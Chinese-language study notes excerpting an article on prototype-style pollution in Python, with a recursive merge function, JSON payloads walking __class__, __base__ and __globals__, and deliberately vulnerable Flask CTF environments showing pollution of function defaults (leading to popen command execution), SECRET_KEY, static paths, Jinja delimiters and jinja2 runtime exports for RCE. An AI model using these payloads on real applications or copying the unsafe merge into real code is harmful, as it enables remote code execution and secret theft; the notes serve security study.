看下面这一篇就够，下面摘亿点重要的地方当作离线的文档
[Python原型链污染变体(prototype-pollution-in-python) - 跳跳糖 (tttang.com)](https://tttang.com/archive/1876/)

由于`Python`中的安全设定和部分特殊属性类型限定，并不是所有的类其所有的属性都是可以被污染的，不过可以肯定的，污染只对类的属性起作用，对于类方法是无效的。由于`Python`中变量空间的设置，实际上还能做到对全局变量中的属性实现污染

就像`Javascript`的原型链污染一样，同样需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下：
```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

#### 自定义属性污染示例

```python
class father:
    secret = "haha"

class son_a(father):
    pass

class son_b(father):
    pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "secret" : "no way"
        }
    }
}

print(son_a.secret)
#haha
print(instance.secret)
#haha
merge(payload, instance)
print(son_a.secret)
#no way
print(instance.secret)
#no way
```

#### 内置属性污染

```python
class father:
    pass

class son_a(father):
    pass

class son_b(father):
    pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "__str__" : "Polluted ~"
        }
    }
}

print(father.__str__)
#<slot wrapper '__str__' of 'object' objects>
merge(payload, instance)
print(father.__str__)
#Polluted ~
```

>Object的属性无法被污染，需要目标类能够被切入点类或对象可以通过属性值查找获取到

## 攻击面拓展
 ### 函数形参默认值替换
 主要用到了函数的`__defaults__`和`__kwdefaults__`这两个内置属性

[](https://storage.tttang.com/media/attachment/2023/01/27/c51e48bf-0b01-4e98-995a-9d2c9e5724b8.png)

[![](https://storage.tttang.com/media/attachment/2023/01/27/c51e48bf-0b01-4e98-995a-9d2c9e5724b8.png)](https://storage.tttang.com/media/attachment/2023/01/27/c51e48bf-0b01-4e98-995a-9d2c9e5724b8.png)

#### __defaults__

`__defaults__`以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参 + 键值形参，关于函数的参数分类可以参考这篇文章：[python 函数的位置参数 (Positional) 和关键字参数(keyword) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/412273465)

从代码上来看，则是如下的效果：
```PYTHON

def func_a(var_1, var_2 =2, var_3 = 3):
    pass

def func_b(var_1, /, var_2 =2, var_3 = 3):
    pass

def func_c(var_1, var_2 =2, *, var_3 = 3):
    pass

def func_d(var_1, /, var_2 =2, *, var_3 = 3):
    pass

print(func_a.__defaults__)
#(2, 3)
print(func_b.__defaults__)
#(2, 3)
print(func_c.__defaults__)
#(2,)
print(func_d.__defaults__)
#(2,)
```

通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如`JSON`等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式
```PYTHON
def evilFunc(arg_1 , shell = False):
    if not shell:
        print(arg_1)
    else:
        print(__import__("os").popen(arg_1).read())

class cls:
    def __init__(self):
        pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

instance = cls()

payload = {
    "__init__" : {
        "__globals__" : {
            "evilFunc" : {
                "__defaults__" : (
                    True ,
                )
            }
        }
    }
}

evilFunc("whoami")
#whoami
merge(payload, instance)
evilFunc("whoami")
#article-kelp
````
#### __kwdefaults__

`__kwdefaults__`以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：
```PYTHON
def func_a(var_1, var_2 =2, var_3 = 3):
    pass

def func_b(var_1, /, var_2 =2, var_3 = 3):
    pass

def func_c(var_1, var_2 =2, *, var_3 = 3):
    pass

def func_d(var_1, /, var_2 =2, *, var_3 = 3):
    pass

print(func_a.__kwdefaults__)
#None
print(func_b.__kwdefaults__)
#None
print(func_c.__kwdefaults__)
#{'var_3': 3}
print(func_d.__kwdefaults__)
#{'var_3': 3}
```
通过替换该属性便能实现对函数键值形参的默认值替换
```PYTHON
def evilFunc(arg_1 , * , shell = False):
    if not shell:
        print(arg_1)
    else:
        print(__import__("os").popen(arg_1).read())

class cls:
    def __init__(self):
        pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

instance = cls()

payload = {
    "__init__" : {
        "__globals__" : {
            "evilFunc" : {
                "__kwdefaults__" : {
                    "shell" : True
                }
            }
        }
    }
}

evilFunc("whoami")
#whoami
merge(payload, instance)
evilFunc("whoami")
#article-kelp
```

### 特定值替换
#### os.environ赋值
可以实现多种利用方式，如`NCTF2022`中`calc`考点对`os.system`的利用，结合`LD_PRELOAD`与文件上传`.so`实现劫持等

#### flask相关特定属性
##### SERET_KEY
实现`session`任意伪造

##### `_got_first_request`

用于判定是否某次请求为自`Flask`启动后第一次请求，是`Flask.got_first_request`函数的返回值，此外还会影响装饰器`app.before_first_request`的调用，依据源码可以知道`_got_first_request`值为假时才会调用

示范环境
```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

flag = "Is flag here?"

@app.before_first_request
def init():
    global flag
    if hasattr(app, "special") and app.special == "U_Polluted_It":
        flag = open("flag", "rt").read()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    global flag
    setattr(app, "special", "U_Polluted_It")
    return flag

app.run(host="0.0.0.0")
```

##### `_static_url_path`

这个属性中存放的是`flask`中静态目录的值，默认该值为`static`。访问`flask`下的资源可以采用如`http://domain/static/xxx`，这样实际上就相当于访问`_static_url_path`目录下`xxx`的文件并将该文件内容作为响应内容返回

示范环境

```python
#app.py

from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "flag in ./flag but heres only static/index.html"


app.run(host="0.0.0.0")
```

##### os.path.pardir

这个`os`模块下的变量会影响`flask`的模板渲染函数`render_template`的解析，所以也收录在`flask`部分，模拟的环境如下：

```python
#app.py

from flask import Flask,request,render_template
import json
import os

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "flag in ./flag but u just can use /file to vist ./templates/file"

@app.route("/<path:path>")
def render_page(path):
    if not os.path.exists("templates/" + path):
        return "not found", 404
    return render_template(path)

app.run(host="0.0.0.0")
```

##### Jinja语法标识符
在默认的规则规则下，常用`Jinja`语法标识符有`{{ Code }}`、`{% Code %}`、`{# Code #}`，当然对于我们需要`RCE`的需求来说，通常前两者才需要留意。而`Flask`官方文档中明确告知了，这些语法标识符均是可以依照`Jinja`中修改的：

![](attachments/Pasted%20image%2020230724165651.png)

在`Jinja`文档中展示了对这些语法标识符进行替换的方法：[API — Jinja Documentation (3.1.x) (palletsprojects.com)](https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment)，即对`Jinja`的环境类的相关属性赋值：

![](attachments/Pasted%20image%2020230724165702.png)

而在`Flask`中使用了`Flask`类（`Lib/site-packages/flask/app.py`）的装饰器装饰后的`jinja_env`方法实现上述的功能；
![](attachments/Pasted%20image%2020230724165728.png)

经过装饰器的装饰后，简单来说可以将该方法视为属性，对该方法的获取就能实现方法调用，类似`Flask.jinja_env`就相当于`Flask.jinja_env()`。

![](attachments/Pasted%20image%2020230724165743.png)

跟进其中调用的`create_jinja_environment`，结合注释就可以发现`jinja_env`方法返回值就是`Jinja`中的环境类（实际上是对原生的`Jinja`环境类做了继承，不过在使用上并无多大区别），所以我们可以直接采用类似`Flask.jinja_env.variable_start_string = "xxx"`来实现对`Jinja`语法标识符进行替换

**示范环境**

```html
#templates/index.html

<html>
<h1>Look this -> [[flag]] <- try to make it become the real flag</h1>
<body>    
</body>
</html>
```

```python
#app.py

from flask import Flask,request,render_template
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "go check /index before merge it"


@app.route('/index',methods=['POST', 'GET'])
def templates():
    return render_template("test.html", flag = open("flag", "rt").read())

app.run(host="0.0.0.0")
```


**payload**

```
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                    "jinja_env" :{
"variable_start_string" : "[[","variable_end_string":"]]"
}        
            }
        }
    }
```

##### Jinja语法全局数据
实际上包括函数、变量、过滤器这三者都能被自定义的添加到`Jinja`语法解析时的环境，操作方式于`Jinja`语法标识符中完全类似

![](attachments/Pasted%20image%2020230724170147.png)

**示例环境**

```html
#templates/index.html

<html>
<h1>{{flag if permission else "No way!"}}</h1>
<body>    
</body>
</html>
```

```python
#app.py

from flask import Flask,request,render_template
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return render_template("index.html", flag = open("flag", "rt").read())

app.run(host="0.0.0.0")
```

##### 模板编译时的变量

在`flask`中如使用`render_template`渲染一个模板实际上经历了多个阶段的处理，其中一个阶段是对模板中的`Jinja`语法进行解析转化为`AST`，而在语法树的根部即`Lib/site-packages/jinja2/compiler.py`中`CodeGenerator`类的`visit_Template`方法纯在一段有趣的逻辑

![](attachments/Pasted%20image%2020230724170355.png)

该逻辑会向输出流写入一段拼接的代码（输出流中代码最终会被编译进而执行），注意其中的`exported_names`变量，该变量为`.runtime`模块（即`Lib/site-packages/jinja2/runtime.py`）中导入的变量`exported`和`async_exported`组合后得到，这就意味着我们可以通过污染`.runtime`模块中这两个变量实现RCE。由于这段逻辑是模板文件解析过程中必经的步骤之一，所以这就意味着只要渲染任意的文件均能通过污染这两属性实现RCE。

示范环境

```html
#templates/index.html

<html>
<h1>nt here~</h1>
<body>    
</body>
</html>
```


```python
#app.py

from flask import Flask,request,render_template
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return render_template("index.html")

app.run(host="0.0.0.0")
```

![](attachments/Pasted%20image%2020230724170507.png)

但是需要注意插入`payload`的位置是AST的根部分，是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的`payload`只会在模板在第一次访问时触发
然后就能在`static`目录下读取到`flag`了
